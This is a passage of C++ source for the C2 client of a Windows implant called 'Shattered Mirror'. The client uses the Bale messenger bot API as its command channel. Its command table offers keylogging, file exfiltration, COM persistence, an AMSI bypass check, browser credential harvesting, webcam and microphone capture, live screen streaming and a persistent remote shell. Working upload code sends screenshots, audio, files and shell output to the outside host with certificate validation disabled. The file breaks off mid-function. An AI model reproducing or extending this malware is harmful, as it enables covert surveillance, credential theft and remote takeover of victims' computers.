/*=============================================================================
 * Shattered Mirror v1 — Atom 12: Bale Bot Client (Secondary C2)
 * OPTION B: Dual pipes – command pipe (unused) and report pipe.
 * FIXED: Blocking read in report listener thread ensures no missed reports.
 *===========================================================================*/

#include "Atom_12_Bale.h"
#include "../Orchestrator/AtomManager.h"
#include "../Orchestrator/Config.h"
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <shlwapi.h>
#include <string>
#include <winhttp.h>
#include <queue>
#include <mutex>
#include <condition_variable>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "shlwapi.lib")

/*===========================================================================
 * Configuration Constants
 *===========================================================================*/
#define BALE_API_HOST L"tapi.bale.ai"
#define BALE_API_PORT 443
#define BALE_TEMP_DIR L"log"
#define BALE_MAX_FILE_SIZE (50 * 1024 * 1024)
#define BALE_POLL_TIMEOUT 30
#define BALE_REPLY_TIMEOUT 15000
#define BALE_REPLY_TIMEOUT_LONG 30000

/*===========================================================================
 * Command Table Entry
 *===========================================================================*/
struct Command {
  const char *name;
  const char *description;
  int atomId;
  bool requiresPayload;
  void (*handler)(const std::string &args);
};

static void HandleHelp(const std::string &args);
static void HandleOnline(const std::string &args);
static void HandleSysinfo(const std::string &args);
static void HandleScreenshot(const std::string &args);
static void HandleKeylogStart(const std::string &args);
static void HandleKeylogFlush(const std::string &args);
static void HandleKeylogStop(const std::string &args);
static void HandleExfil(const std::string &args);
static void HandlePersist(const std::string &args);
static void HandleProcList(const std::string &args);
static void HandleScan(const std::string &args);
static void HandleScanFlush(const std::string &args);
static void HandlePing(const std::string &args);
static void HandleShell(const std::string &args);
static void HandleAmsiStatus(const std::string &args);
static void HandleSetDomain(const std::string &args);
static void HandleSpyCam(const std::string &args);
static void HandleSpyMic(const std::string &args);
static void HandleSpyBoth(const std::string &args);
static void HandleCreds(const std::string &args);
static void HandleStopAtom(const std::string &args);
static void HandleForceStop(const std::string &args);
static void HandleListAtoms(const std::string &args);
static void HandleLiveScreen(const std::string &args);
static void HandleLiveMic(const std::string &args);
static void HandleStopLive(const std::string &args);

/*===========================================================================
 * Binary Report Header (used for single-shot small payloads)
 *===========================================================================*/
typedef struct _BALE_REPORT_HEADER {
  DWORD dwType;      /* 0 = Text, 1 = Screenshot, 2 = Audio, 3 = File, 4 = Cam */
  DWORD dwFlags;     /* 0x00=single, 0x10=chunk_start, 0x11=chunk_data, 0x12=chunk_end */
  DWORD dwPayloadLen;
} BALE_REPORT_HEADER, *PBALE_REPORT_HEADER;

/* Chunk flags for multi-message binary transfer */
#define BALE_FLAG_SINGLE     0x00
#define BALE_FLAG_CHUNK_START 0x10
#define BALE_FLAG_CHUNK_DATA  0x11
#define BALE_FLAG_CHUNK_END   0x12

/*===========================================================================
 * Reassembly Buffer — accumulates chunks per atom until complete
 *===========================================================================*/
#include <vector>
#include <map>
struct ReassemblyBuffer {
  DWORD dwType;                 // Screenshot/Audio/File/Cam
  std::vector<BYTE> data;       // Accumulated binary data
  std::string filename;         // Optional filename from meta
  BOOL bActive;                 // Is reassembly in progress?
};
static std::map<DWORD, ReassemblyBuffer> g_ReassemblyBuffers;

/*===========================================================================
 * Async Upload Queue
 *===========================================================================*/
struct UploadJob {
  int type; // 1 = Memory, 2 = File, 3 = Message
  std::vector<BYTE> data;
  std::wstring filePath;
  std::string fileName;
  std::string caption;
  std::string text;
  bool deleteAfter;
};

static std::queue<UploadJob> g_UploadQueue;
static std::mutex g_UploadMutex;
static std::condition_variable g_UploadCV;

static BOOL UploadMemoryToTelegramImpl(const BYTE *pData, DWORD dwDataLen, const std::string &fileName, const std::string &caption, BOOL bIsPhoto);
static BOOL UploadFileToTelegramImpl(const std::wstring &filePath, const std::string &caption);
static BOOL SendTelegramMessageImpl(const std::string &text);

DWORD WINAPI TelegramUploaderThread(LPVOID) {
  while (TRUE) {
    UploadJob job;
    {
      std::unique_lock<std::mutex> lock(g_UploadMutex);
      g_UploadCV.wait(lock, [] { return !g_UploadQueue.empty(); });
      job = g_UploadQueue.front();
      g_UploadQueue.pop();
    }
    
    if (job.type == 1) {
      UploadMemoryToTelegramImpl(job.data.data(), (DWORD)job.data.size(), job.fileName, job.caption, FALSE);
    } else if (job.type == 2) {
      UploadFileToTelegramImpl(job.filePath, job.caption);
      if (job.deleteAfter) DeleteFileW(job.filePath.c_str());
    } else if (job.type == 3) {
      SendTelegramMessageImpl(job.text);
    }
  }
  return 0;
}

/*===========================================================================
 * Global State
 *===========================================================================*/
static long long g_llPingStartTime = 0;
static long long g_llPingFrequency = 0;

static HANDLE g_hReportPipe =
    NULL; // For sending spawn requests & receiving forwarded reports
static HANDLE g_hCmdPipe = NULL; // Unused in Bale, but kept for symmetry
static BYTE g_SessionKey[16];
static std::string g_LastUpdateId = "0";
static int g_KeylogSpamCount = 0;
static DWORD g_LastKeylogSpamTime = 0;

static BOOL SendTelegramMessage(const std::string &text);

/* Persistent Shell State */
static HANDLE g_hShellProc = NULL;
static HANDLE g_hShellInW = NULL;
static HANDLE g_hShellOutR = NULL;
static bool   g_bShellRunning = false;

DWORD WINAPI PersistentShellReader(LPVOID lpParam) {
    char buf[4096];
    DWORD dwRead;
    std::string accumulator;
    DWORD lastSend = GetTickCount();

    while (g_bShellRunning) {
        DWORD dwAvail = 0;
        if (g_hShellOutR != NULL && PeekNamedPipe(g_hShellOutR, NULL, 0, NULL, &dwAvail, NULL) && dwAvail > 0) {
            if (ReadFile(g_hShellOutR, buf, sizeof(buf) - 1, &dwRead, NULL) && dwRead > 0) {
                buf[dwRead] = '\0';
                accumulator += buf;
            }
        }

        if (!accumulator.empty()) {
            // Send if buffer is large or some time has passed since last chunk
            if (GetTickCount() - lastSend > 300 || accumulator.length() > 3500) {
                // Strip nulls that might break JSON/Telegram
                std::string filtered;
                for (char c : accumulator) if (c != '\0') filtered += c;
                
                if (!filtered.empty()) {
                    SendTelegramMessage("💻 Shell Output:\n" + filtered);
                }
                accumulator.clear();
                lastSend = GetTickCount();
            }
        }
        Sleep(100);
    }
    return 0;
}

/*===========================================================================
 * Command Table
 *===========================================================================*/
static const Command g_Commands[] = {
    {"/help", "Show this help", 0, false, HandleHelp},
    {"/online", "Show implant status", 0, false, HandleOnline},
    {"/sysinfo", "Collect system information", 3, false, HandleSysinfo},
    {"/screenshot", "Capture screen and upload", 6, false, HandleScreenshot},
    {"/keylog_start", "Start keylogger", 2, false, HandleKeylogStart},
    {"/keylog_flush", "Flush and return keystrokes", 2, false,
     HandleKeylogFlush},
    {"/keylog_stop", "Stop keylogger", 2, false, HandleKeylogStop},
    {"/exfil", "Exfiltrate a file", 5, true, HandleExfil},
    {"/persist", "Install COM persistence", 7, false, HandlePersist},
    {"/proc_list", "List running processes", 8, false, HandleProcList},
    {"/scan", "Scan directory for sensitive files", 9, true, HandleScan},
    {"/scan_flush", "Flush current scan log and send as file", 9, false, HandleScanFlush},
    {"/ping", "Measure round‑trip time", 11, false, HandlePing},
    {"/shell", "Execute a shell command", 10, true, HandleShell},
    {"/amsi_status", "Check AMSI bypass state", 4, false, HandleAmsiStatus},
    {"/set_domain", "Set the primary C2 domain (e.g., /set_domain ip:port)", 1, true, HandleSetDomain},
    {"/spy_cam", "Capture webcam snapshot", 14, false, HandleSpyCam},
    {"/spy_mic", "Record mic. /spy_mic <sec> (Default 30s)", 14, true, HandleSpyMic},
    {"/spy_both", "Capture webcam and audio", 14, false, HandleSpyBoth},
    {"/creds", "Harvest browser credentials", 13, false, HandleCreds},
    {"/stop_atom", "Stop an atom by ID (e.g., /stop_atom 2)", 0, true,
     HandleStopAtom},
    {"/force_stop", "Kill all active tasks (screen, scan, etc.)", 0, false, HandleForceStop},
    {"/list_atoms", "List running atoms from Orchestrator", 0, false, HandleListAtoms},
    {"/live_screen", "Start continuous screenshot stream", 6, false, HandleLiveScreen},
    {"/live_mic", "Start continuous mic recording (30s clips)", 14, false, HandleLiveMic},
    {"/stop_live", "Stop live capture (screen|mic|both)", 0, true, HandleStopLive},
};
static const int g_CommandCount = sizeof(g_Commands) / sizeof(g_Commands[0]);

/*===========================================================================
 * Debug Logging
 *===========================================================================*/
static void DebugLog(const char *format, ...) {
  if (!Config::LOGGING_ENABLED) return;
  char buf[2048];
  va_list args;
  va_start(args, format);
  vsnprintf(buf, sizeof(buf), format, args);
  va_end(args);
  FILE *f = fopen("log\\bale_debug.txt", "a");
  if (f) {
    fprintf(f, "%s\n", buf);
    fclose(f);
  }
}

/*===========================================================================
 * JSON Escaping
 *===========================================================================*/
static std::string JsonEscape(const std::string &s) {
  std::string out;
  for (unsigned char c : s) {
    if (c == '"') out += "\\\"";
    else if (c == '\\') out += "\\\\";
    else if (c == '\n') out += "\\n";
    else if (c == '\r') out += "\\r";
    else if (c == '\t') out += "\\t";
    else if (c < 32) {
      char hex[8];
      sprintf_s(hex, "\\u%04x", c);
      out += hex;
    } else {
      out += c;
    }
  }
  return out;
}

/*===========================================================================
 * WinHTTP Helpers
 *===========================================================================*/
static std::string HttpRequest(const std::wstring &method,
                               const std::wstring &path,
                               const std::string &body = "") {
  DebugLog("[HTTP] %ls %ls", method.c_str(), path.c_str());
  if (!body.empty())
    DebugLog("[HTTP] Body: %s", body.c_str());

  HINTERNET hSession = WinHttpOpen(
      L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) {
    DebugLog("[HTTP] WinHttpOpen failed: %lu", GetLastError());
    return "";
  }

  HINTERNET hConnect =
      WinHttpConnect(hSession, BALE_API_HOST, BALE_API_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return "";
  }

  DWORD flags = (BALE_API_PORT == 443) ? WINHTTP_FLAG_SECURE : 0;
  HINTERNET hRequest = WinHttpOpenRequest(
      hConnect, method.c_str(), path.c_str(), NULL, NULL, NULL, flags);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return "";
  }

  std::wstring headers = L"Content-Type: application/json\r\n";
  BOOL bSend = body.empty()
                   ? WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)
                   : WinHttpSendRequest(
                         hRequest, headers.c_str(), -1, (LPVOID)body.c_str(),
                         (DWORD)body.length(), (DWORD)body.length(), 0);

  std::string response;
  if (bSend && WinHttpReceiveResponse(hRequest, NULL)) {
    DWORD status = 0, sz = sizeof(status);
    WinHttpQueryHeaders(
        hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &status, &sz, WINHTTP_NO_HEADER_INDEX);
    DebugLog("[HTTP] Status: %lu", status);
    DWORD dwSize = 0;
    char buf[8192];
    DWORD dwRead = 0;
    while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
      if (dwSize > sizeof(buf) - 1)
        dwSize = sizeof(buf) - 1;
      if (WinHttpReadData(hRequest, buf, dwSize, &dwRead)) {
        buf[dwRead] = '\0';
        response += buf;
      }
    }
  } else {
    DebugLog("[HTTP] Send/Receive failed: %lu", GetLastError());
  }
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  if (response.length() > 500)
    DebugLog("[HTTP] Response: %.500s...", response.c_str());
  else
    DebugLog("[HTTP] Response: %s", response.c_str());
  return response;
}

static std::string HttpGet(const std::wstring &path) {
  return HttpRequest(L"GET", path);
}
static std::string HttpPost(const std::wstring &path,
                            const std::string &jsonBody) {
  return HttpRequest(L"POST", path, jsonBody);
}

/*===========================================================================
 * Telegram API Wrappers
 *===========================================================================*/
static BOOL SendTelegramMessageImpl(const std::string &text) {
  std::wstring path =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN)) +
      L"/sendMessage";
  std::string json = "{\"chat_id\":\"" + std::string(Config::BALE_CHAT_ID) +
                     "\",\"text\":\"" + JsonEscape(text) + "\"}";
  std::string resp = HttpPost(path, json);
  return resp.find("\"ok\":true") != std::string::npos;
}

static BOOL SendTelegramMessage(const std::string &text) {
  UploadJob job;
  job.type = 3;
  job.text = text;
  {
    std::lock_guard<std::mutex> lock(g_UploadMutex);
    g_UploadQueue.push(job);
  }
  g_UploadCV.notify_one();
  return TRUE;
}

static void SendLargeMessage(const std::string &text) {
  const size_t MAX_LEN = 4000;
  if (text.length() <= MAX_LEN) {
    SendTelegramMessage(text);
    return;
  }
  size_t pos = 0;
  int part = 1;
  while (pos < text.length()) {
    size_t len = min(MAX_LEN, text.length() - pos);
    SendTelegramMessage("[" + std::to_string(part) + "] " +
                        text.substr(pos, len));
    pos += len;
    part++;
    if (pos < text.length())
      Sleep(500);
  }
}

static BOOL UploadFileToTelegramImpl(const std::wstring &filePath,
                                 const std::string &caption = "") {
  DebugLog("[UPLOAD] Uploading %ls", filePath.c_str());
  HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                             NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (hFile == INVALID_HANDLE_VALUE) {
    DebugLog("[UPLOAD] Cannot open file: %lu", GetLastError());
    return FALSE;
  }
  DWORD fileSize = GetFileSize(hFile, NULL);
  if (fileSize == 0 || fileSize > BALE_MAX_FILE_SIZE) {
    CloseHandle(hFile);
    return FALSE;
  }
  BYTE *fileData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, fileSize);
  if (!fileData) {
    CloseHandle(hFile);
    return FALSE;
  }
  DWORD read;
  ReadFile(hFile, fileData, fileSize, &read, NULL);
  CloseHandle(hFile);

  std::string boundary = "----ShatteredMirrorBoundary";
  std::string body;
  body += "--" + boundary +
          "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
          std::string(Config::BALE_CHAT_ID) + "\r\n";
  if (!caption.empty())
    body += "--" + boundary +
            "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" +
            caption + "\r\n";
  char fileNameA[MAX_PATH];
  WideCharToMultiByte(CP_UTF8, 0, PathFindFileNameW(filePath.c_str()), -1,
                      fileNameA, sizeof(fileNameA), NULL, NULL);
  std::string contentType = "application/octet-stream";
  std::string fnStr = std::string(fileNameA);
  if (fnStr.find(".png") != std::string::npos) contentType = "image/png";
  else if (fnStr.find(".txt") != std::string::npos) contentType = "text/plain";
  else if (fnStr.find(".zip") != std::string::npos) contentType = "application/zip";
  else if (fnStr.find(".wav") != std::string::npos) contentType = "audio/wav";

  body += "--" + boundary +
          "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" +
          fnStr +
          "\"\r\nContent-Type: " + contentType + "\r\n\r\n";
  std::string footer = "\r\n--" + boundary + "--\r\n";
  DWORD totalSize = (DWORD)body.length() + fileSize + (DWORD)footer.length();
  BYTE *postData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, totalSize);
  if (!postData) {
    HeapFree(GetProcessHeap(), 0, fileData);
    return FALSE;
  }
  memcpy(postData, body.c_str(), body.length());
  memcpy(postData + body.length(), fileData, fileSize);
  memcpy(postData + body.length() + fileSize, footer.c_str(), footer.length());
  HeapFree(GetProcessHeap(), 0, fileData);

  HINTERNET hSession = WinHttpOpen(
      L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
  if (!hSession) {
    HeapFree(GetProcessHeap(), 0, postData);
    return FALSE;
  }
  HINTERNET hConnect =
      WinHttpConnect(hSession, BALE_API_HOST, BALE_API_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    HeapFree(GetProcessHeap(), 0, postData);
    return FALSE;
  }
  std::wstring path =
      L"/bot" +
      std::wstring(Config::BALE_BOT_TOKEN,
                   Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN)) +
      L"/sendDocument";
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL,
                                          NULL, NULL, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    HeapFree(GetProcessHeap(), 0, postData);
    return FALSE;
  }
  std::wstring headers = L"Content-Type: multipart/form-data; boundary=" +
                         std::wstring(boundary.begin(), boundary.end()) +
                         L"\r\n";
  BOOL bSuccess = WinHttpSendRequest(hRequest, headers.c_str(), -1, postData,
                                     totalSize, totalSize, 0);
  if (bSuccess)
    WinHttpReceiveResponse(hRequest, NULL);
  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  HeapFree(GetProcessHeap(), 0, postData);
  return bSuccess;
}

static BOOL UploadFileToTelegram(const std::wstring &filePath,
                                 const std::string &caption = "", bool deleteAfter = false) {
  UploadJob job;
  job.type = 2;
  job.filePath = filePath;
  job.caption = caption;
  job.deleteAfter = deleteAfter;
  {
    std::lock_guard<std::mutex> lock(g_UploadMutex);
    g_UploadQueue.push(job);
  }
  g_UploadCV.notify_one();
  return TRUE;
}

/*===========================================================================
 * Upload raw bytes from memory directly to Bale (no temp file needed)
 * Always uses /sendDocument — Bale does NOT reliably support /sendPhoto.
 * Includes retry logic (3 attempts), explicit timeouts, and TLS flags.
 *===========================================================================*/
static BOOL UploadMemoryToTelegramImpl(const BYTE *pData, DWORD dwDataLen,
                                    const std::string &fileName,
                                    const std::string &caption,
                                    BOOL /*bIsPhoto — unused, always sendDocument*/) {
  if (!pData || dwDataLen == 0 || dwDataLen > BALE_MAX_FILE_SIZE) return FALSE;
  DebugLog("[UPLOAD_MEM] Uploading %lu bytes as '%s'", dwDataLen, fileName.c_str());

  // --- Build multipart body ---
  std::string boundary = "----BaleUpload" + std::to_string(GetTickCount());
  std::string body;
  body += "--" + boundary +
          "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" +
          std::string(Config::BALE_CHAT_ID) + "\r\n";
  if (!caption.empty())
    body += "--" + boundary +
            "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" +
            caption + "\r\n";

  // Always use "document" field — Bale handles this reliably
  std::string contentType = "application/octet-stream";
  if (fileName.find(".png") != std::string::npos) contentType = "image/png";
  else if (fileName.find(".jpg") != std::string::npos || fileName.find(".jpeg") != std::string::npos) contentType = "image/jpeg";
  else if (fileName.find(".txt") != std::string::npos) contentType = "text/plain";
  else if (fileName.find(".zip") != std::string::npos) contentType = "application/zip";
  else if (fileName.find(".wav") != std::string::npos) contentType = "audio/wav";

  body += "--" + boundary +
          "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" +
          fileName +
          "\"\r\nContent-Type: " + contentType + "\r\n\r\n";
  std::string footer = "\r\n--" + boundary + "--\r\n";

  DWORD totalSize = (DWORD)body.length() + dwDataLen + (DWORD)footer.length();
  BYTE *postData = (BYTE *)HeapAlloc(GetProcessHeap(), 0, totalSize);
  if (!postData) return FALSE;

  memcpy(postData, body.c_str(), body.length());
  memcpy(postData + body.length(), pData, dwDataLen);
  memcpy(postData + body.length() + dwDataLen, footer.c_str(), footer.length());

  DebugLog("[UPLOAD_MEM] Multipart body built: header=%lu + data=%lu + footer=%lu = %lu total",
           (DWORD)body.length(), dwDataLen, (DWORD)footer.length(), totalSize);

  // --- Retry loop (3 attempts) ---
  BOOL bSuccess = FALSE;
  for (int attempt = 1; attempt <= 3 && !bSuccess; attempt++) {
    if (attempt > 1) {
      DebugLog("[UPLOAD_MEM] Retry attempt %d/3...", attempt);
      Sleep(1000 * attempt); // backoff: 2s, 3s
    }

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) { continue; }

    // Set timeouts: 60s resolve, 60s connect, 120s send, 120s receive
    DWORD timeout_resolve = 60000;
    DWORD timeout_connect = 60000;
    DWORD timeout_send    = 120000;
    DWORD timeout_receive = 120000;
    WinHttpSetOption(hSession, WINHTTP_OPTION_RESOLVE_TIMEOUT, &timeout_resolve, sizeof(DWORD));
    WinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout_connect, sizeof(DWORD));
    WinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout_send,    sizeof(DWORD));
    WinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout_receive, sizeof(DWORD));

    HINTERNET hConnect = WinHttpConnect(hSession, BALE_API_HOST, BALE_API_PORT, 0);
    if (!hConnect) {
      WinHttpCloseHandle(hSession);
      continue;
    }

    // Always use /sendDocument — Bale's /sendPhoto returns 500
    std::wstring path =
        L"/bot" +
        std::wstring(Config::BALE_BOT_TOKEN,
                     Config::BALE_BOT_TOKEN + strlen(Config::BALE_BOT_TOKEN)) +
        L"/sendDocument";
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL,
                                            NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
      WinHttpCloseHandle(hConnect);
      WinHttpCloseHandle(hSession);
      continue;
    }

    // Set TLS security flags — tolerate Bale's certificate chain
    DWORD dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(dwSecFlags));

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" +
                           std::wstring(boundary.begin(), boundary.end()) + L"\r\n";

    bSuccess = WinHttpSendRequest(hRequest, headers.c_str(), -1, postData,
                                       totalSize, totalSize, 0);
    if (bSuccess) {
      bSuccess = WinHttpReceiveResponse(hRequest, NULL);
      if (bSuccess) {
          DWORD dwStatusCode = 0;
          DWORD dwSize = sizeof(dwStatusCode);
          WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                              WINHTTP_HEADER_NAME_BY_INDEX, &dwStatusCode, &dwSize, WINHTTP_NO_HEADER_INDEX);

          DWORD dwAvailable = 0;
          std::string responseStr;
          while (WinHttpQueryDataAvailable(hRequest, &dwAvailable) && dwAvailable > 0) {
              char* buf = new char[dwAvailable + 1];
              DWORD dwRead = 0;
              if (WinHttpReadData(hRequest, buf, dwAvailable, &dwRead)) {
                  buf[dwRead] = '\0';
                  responseStr += buf;
              }
              delete[] buf;
          }

          DebugLog("[UPLOAD_MEM] Attempt %d — Status: %lu, Response: %.512s",
                   attempt, dwStatusCode, responseStr.c_str());

          if (dwStatusCode != 200) {
              bSuccess = FALSE; // will retry
          }
      } else {
          DebugLog("[UPLOAD_MEM] Attempt %d — WinHttpReceiveResponse failed: %lu", attempt, GetLastError());
      }
    } else {
        DebugLog("[UPLOAD_MEM] Attempt %d — WinHttpSendRequest failed: %lu", attempt, GetLastError());
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
  } // end retry loop

  HeapFree(GetProcessHeap(), 0, postData);
  DebugLog("[UPLOAD_MEM] Final result: %s for '%s'", bSuccess ? "OK" : "FAILED", fileName.c_str());
  return bSuccess;
}

static BOOL UploadMemoryToTelegram(const BYTE *pData, DWORD dwDataLen,
                                   const std::string &fileName,
                                   const std::string &caption,
                                   BOOL bIsPhoto) {
  UploadJob job;
  job.type = 1;
  job.data.assign(pData, pData + dwDataLen);
  job.fileName = fileName;
  job.caption = caption;
  {
    std::lock_guard<std::mutex> lock(g_UploadMutex);
    g_UploadQueue.push(job);
  }
  g_UploadCV.notify_one();
  return TRUE;
}

/*===========================================================================
 * IPC Helpers
 *===========================================================================*/
static BOOL SendSpawnRequest(int atomId, const std::string &payload) {
  if (!g_hReportPipe) {
    DebugLog("[SPAWN] No report pipe");
    return FALSE;
  }
  std::string req =
      std::to_string(atomId) + (payload.empty() ? "" : ":" + payload);
  IPC_MESSAGE msg = {0};
  msg.dwSignature = 0x534D4952;
  msg.CommandId = CMD_SPAWN_ATOM;
  msg.dwPayloadLen = (DWORD)req.length();
  memcpy(msg.Payload, req.c_str(), req.length());
  DebugLog("[SPAWN] Sending: %s", req.c_str());
  return IPC_SendMessage(g_hReportPipe, &msg, g_SessionKey, 16);
}

static BOOL SendStopRequest(int atomId) {
  return SendSpawnRequest(atomId, "STOP");
}

/*===========================================================================
 * Process a single forwarded report (called by listener thread)
 *===========================================================================*/
static const char* GetTypeString(DWORD dwType) {
  switch (dwType) {
    case 1: return "Screenshot";
    case 2: return "Audio";
    case 3: return "File";
    case 4: return "Cam";
    default: return "Unknown";
  }
}
static const char* GetTypeExt(DWORD dwType) {
  switch (dwType) {
    case 1: return ".png";
    case 2: return ".wav";
    case 3: return ".bin";
    case 4: return ".bmp";
    default: return ".bin";
  }
}

static void FinalizeAndUpload(DWORD atomId, ReassemblyBuffer &buf) {
  if (buf.data.empty()) return;
  char fileName[128];
  if (!buf.filename.empty()) {
    sprintf_s(fileName, "%s", buf.filename.c_str());
  } else {
    sprintf_s(fileName, "atom%lu_%lu%s", atomId, GetTickCount(), GetTypeExt(buf.dwType));
  }
  std::string caption = std::string(GetTypeString(buf.dwType)) +
                        " from Atom " + std::to_string(atomId) +
                        " (" + std::to_string(buf.data.size()) + " bytes)";
  if (UploadMemoryToTelegram(buf.data.data(), (DWORD)buf.data.size(), fileName, caption, buf.dwType == 1 || buf.dwType == 4)) {
    DebugLog("[REASSEMBLY] Uploaded %s (%lu bytes)", fileName, (DWORD)buf.data.size());
  } else {
    DebugLog("[REASSEMBLY] Upload FAILED for %s", fileName);
    SendTelegramMessage("❌ Upload failed: " + std::string(fileName));
  }
  buf.data.clear();
  buf.bActive = FALSE;
}

static void ProcessBaleReport(DWORD atomId, const BYTE* payload, DWORD len) {
  if (len < sizeof(BALE_REPORT_HEADER)) {
    // Fallback: treat as raw text (e.g. Atom 03 sysinfo without header)
    std::string text((const char*)payload, len);
    DebugLog("[BALE_REPORT] Raw text from Atom %lu: %s", atomId, text.c_str());
    SendLargeMessage("Atom " + std::to_string(atomId) + ":\n" + text);
    return;
  }

  PBALE_REPORT_HEADER pHeader = (PBALE_REPORT_HEADER)payload;
  const BYTE* pData = payload + sizeof(BALE_REPORT_HEADER);
  DWORD dataLen = len - sizeof(BALE_REPORT_HEADER);

  // --- Handle text type (type 0) as a chat message ---
  if (pHeader->dwType == 0) {
    std::string text((const char*)pData, dataLen);
    DebugLog("[BALE_REPORT] Text report from Atom %lu", atomId);
    SendLargeMessage("Atom " + std::to_string(atomId) + ":\n" + text);
    return;
  }

  // --- Chunked transfer handling ---
  if (pHeader->dwFlags == BALE_FLAG_CHUNK_START) {
    // Start new reassembly
    ReassemblyBuffer &buf = g_ReassemblyBuffers[atomId];
    buf.dwType = pHeader->dwType;
    buf.data.clear();
    buf.bActive = TRUE;
    if (dataLen > 0) {
      // Start chunk may contain metadata (filename etc)
      std::string meta((const char*)pData, dataLen);
      size_t namePos = meta.find("name=");
      if (namePos != std::string::npos) {
        buf.filename = meta.substr(namePos + 5);
        size_t spacePos = buf.filename.find(' ');
        if (spacePos != std::string::npos) buf.filename = buf.filename.substr(0, spacePos);
      }
    }
    DebugLog("[REASSEMBLY] Started for Atom %lu, type=%lu", atomId, pHeader->dwType);
    SendTelegramMessage("⏳ Receiving " + std::string(GetTypeString(pHeader->dwType)) + " from Atom " + std::to_string(atomId) + "...");
    return;
  }

  if (pHeader->dwFlags == BALE_FLAG_CHUNK_DATA) {
    auto it = g_ReassemblyBuffers.find(atomId);
    if (it != g_ReassemblyBuffers.end() && it->second.bActive) {
      it->second.data.insert(it->second.data.end(), pData, pData + dataLen);
      DebugLog("[REASSEMBLY] Atom %lu chunk: +%lu bytes (total: %lu)",
               atomId, dataLen, (DWORD)it->second.data.size());
    } else {
      DebugLog("[REASSEMBLY] WARN: Chunk data for Atom %lu but no active reassembly!", atomId);
    }
    return;
  }

  if (pHeader->dwFlags == BALE_FLAG_CHUNK_END) {
    auto it = g_ReassemblyBuffers.find(atomId);
    if (it != g_ReassemblyBuffers.end() && it->second.bActive) {
      // Append any final data
      if (dataLen > 0) {
        it->second.data.insert(it->second.data.end(), pData, pData + dataLen);
      }
      DebugLog("[REASSEMBLY] Atom %lu complete: %lu bytes total",
               atomId, (DWORD)it->second.data.size());
      FinalizeAndUpload(atomId, it->second);
    } else {
      DebugLog("[REASSEMBLY] WARN: Chunk end for Atom %lu but no active reassembly!", atomId);
    }
    return;
  }

  // --- Single-shot (BALE_FLAG_SINGLE or legacy flag=0) ---
  // Small enough to upload directly from memory
  if (dataLen > 0) {
    char fileName[128];
    sprintf_s(fileName, "atom%lu_%lu%s", atomId, GetTickCount(), GetTypeExt(pHeader->dwType));
    std::string caption = std::string(GetTypeString(pHeader->dwType)) +
                          " from Atom " + std::to_string(atomId);
    if (UploadMemoryToTelegram(pData, dataLen, fileName, caption, pHeader->dwType == 1 || pHeader->dwType == 4)) {
      DebugLog("[LISTENER] Single-shot uploaded: %s (%lu bytes)", fileName, dataLen);
    } else {
      DebugLog("[LISTENER] Single-shot upload FAILED: %s", fileName);
    }
  }
}

static void ProcessForwardedReport(DWORD atomId, const std::string &data) {
  DebugLog("[LISTENER] Processing report from Atom %d: %s", atomId,
           data.c_str());

  // Ignore ACK/NACK/STOPPED messages
  if (data.find("ACK:") == 0 || data.find("NACK:") == 0 ||
      data.find("STOPPED:") == 0)
    return;

  // Keylogger spam filter
